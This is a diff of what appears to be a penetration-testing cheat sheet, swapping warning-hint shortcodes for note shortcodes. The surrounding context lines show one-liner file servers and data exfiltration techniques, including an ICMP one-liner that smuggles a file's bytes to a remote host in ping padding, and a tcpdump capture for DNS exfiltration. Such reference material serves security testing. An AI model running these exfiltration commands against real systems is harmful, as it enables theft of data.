@@ -136,9 +136,9 @@ ruby -r webrick -e 'WEBrick::HTTPServer.new(:Port => {{< param "war.lport" >}}, 
 perl -MHTTP::Daemon -e '$d = HTTP::Daemon->new(LocalPort => {{< param "war.lport" >}}) or  +die $!; while($c = $d->accept){while($r = $c->get_request){+$c->send_file_response(".".$r->url->path)}}'
 ```
 
-{{<hint warning>}}
+{{<note>}}
 Install `HTTP:Daemon` if not present with: `sudo cpan HTTP::Daemon`
-{{</hint>}}
+{{</note>}}
 
 ### PHP
 
@@ -204,9 +204,9 @@ xxd -p -c 8 {{< param "war.tfile" >}} | while read h; do ping -c 1 -p $h {{< par
 - `-p`: You may specify up to 16 "pad" bytes to fill out the packet you send.
 {{</details>}}
 
-{{<hint warning>}}
+{{<note>}}
 Match `xxd` columns (`-c 8`) with the data sliced (`packet[ICMP].load[-8:]`) in the script.
-{{</hint>}}
+{{</note>}}
 
 ### DNS
 
@@ -216,9 +216,9 @@ Capture DNS packets data.
 sudo tcpdump -n -i {{< param "war.liface" >}} -w dns_exfil.pcap udp and src {{< param "war.rhost" >}} and port 53
 ```
 
-{{<hint warning>}}
+{{<note>}}
 Remember to point the DNS resolution to where packages are being captured.
-{{</hint>}}
+{{</note>}}
 
 Generate DNS queries.
 
